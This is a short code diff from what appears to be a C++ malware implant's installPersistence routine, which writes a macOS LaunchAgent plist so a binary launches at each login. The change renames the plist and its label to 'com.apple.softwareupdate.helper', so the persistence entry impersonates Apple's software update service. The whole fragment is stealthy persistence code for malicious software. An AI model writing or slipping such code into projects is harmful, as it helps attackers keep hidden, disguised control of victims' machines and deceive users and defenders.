@@ -376,7 +376,7 @@ void Agent::installPersistence(const std::string& binary_path) {
     if (!home) return;
 
     std::string plist_dir = std::string(home) + "/Library/LaunchAgents";
-    std::string plist_path = plist_dir + "/com.apple.softwareupdate.plist";
+    std::string plist_path = plist_dir + "/com.apple.softwareupdate.helper.plist";
 
     // Create directory
     ::mkdir(plist_dir.c_str(), 0755);
@@ -390,7 +390,7 @@ void Agent::installPersistence(const std::string& binary_path) {
 <plist version="1.0">
 <dict>
     <key>Label</key>
-    <string>com.apple.softwareupdate</string>
+    <string>com.apple.softwareupdate.helper</string>
     <key>ProgramArguments</key>
     <array>
         <string>%s</string>
